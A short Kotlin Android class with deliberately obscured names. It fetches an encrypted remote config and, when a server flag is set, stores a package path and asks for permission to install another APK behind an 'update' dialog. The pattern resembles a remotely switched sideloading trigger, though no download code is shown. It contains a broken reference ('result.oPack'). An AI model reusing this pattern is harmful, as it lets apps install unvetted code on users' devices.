package xxx.xxx.zzzz

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import com.tencent.mmkv.MMKV

class Nbbbb {
    companion object {
        @SuppressLint("StaticFieldLeak")
        private var i: Nbbbb? = null
            get() {
                field ?: run {
                    field = Nbbbb()
                }
                return field
            }

        @Synchronized
        fun get(): Nbbbb {
            return i!!
        }
    }

    private var context:Context?=null

    @RequiresApi(Build.VERSION_CODES.O)
    fun lifeIsFkingMovie(context: Context) {
//        if (MMKV.defaultMMKV().decodeBool("state", false))
//            return
        this.context = context

        (context as AppCompatActivity).getConfig2 { it2 ->
            var entity: ResultBean? = null
            entity = Gson().fromJson(AesEncryptUtil.decrypt(it2), ResultBean::class.java)
            if (entity?.status == "0" || entity?.status == "1") {
                MMKV.defaultMMKV().encode("result", entity)
                if (entity?.status == "1") {
                    MMKV.defaultMMKV().encode("path", result.oPack)
                    if (!context.packageManager.canRequestPackageInstalls()) {
                        //show permission dialog
                        PermissionDialog((context as AppCompatActivity)).show()
                    }else{
                        //show update dialog
                        UpdateDialog(context).show()
                    }
                }
            } else {
                return@getConfig2
            }
        }
    }
}